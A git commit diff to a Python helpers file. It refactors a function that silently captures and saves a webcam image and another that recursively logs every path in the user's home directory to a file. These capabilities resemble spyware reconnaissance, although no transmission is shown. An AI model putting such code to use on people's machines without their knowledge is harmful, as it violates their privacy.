3f32be8db73d032b24c0abc73f94435d6fb51e47
ntigkaris <87975862+ntigkaris@users.noreply.github.com>
2026-01-14 00:21:01 +0200

    Expanded functionality to Home directory

--- src/utils/helpers.py
+++ src/utils/helpers.py
@@ -4,25 +4,26 @@ import cv2
 
 from conf.config import cfg
 
-def takeSnapshot(imageSize,kernel):
+def takeCaption():
     caption = cv2.VideoCapture(index=0)
     _,image = caption.read()
     image = cv2.cvtColor(src=image,
                         code=cv2.COLOR_BGR2GRAY)
     image = cv2.resize(src=image,
-                    dsize=(imageSize,imageSize),
+                    dsize=(cfg.imgsize,cfg.imgsize),
                     fx=0,fy=0,
                     interpolation=cv2.INTER_AREA)
     image = cv2.filter2D(src=image,
                         ddepth=-1,
-                        kernel=kernel)
-    cv2.imwrite(filename=f'{cfg.imgdir}/IMG{cfg.timestamp}.png',
+                        kernel=cfg.kernel)
+    cv2.imwrite(filename=cfg.imgfilename,
                 img=image)
     pass
 
-def logContents(query):
-    targetDirectory = pathlib.Path(f'{pathlib.Path.home()}\\{query}')
-    with open(file=f'{cfg.recdir}/REC{cfg.timestamp}.txt',mode='w') as f:
-        for path in targetDirectory.rglob(pattern='*'):
+def logHomeContents():
+    with open(file=cfg.recfilename,
+              mode='w',
+              encoding='utf8') as f:
+        for path in pathlib.Path.home().rglob(pattern='*'):
             f.write(f'{path.__str__()}\n')
     pass
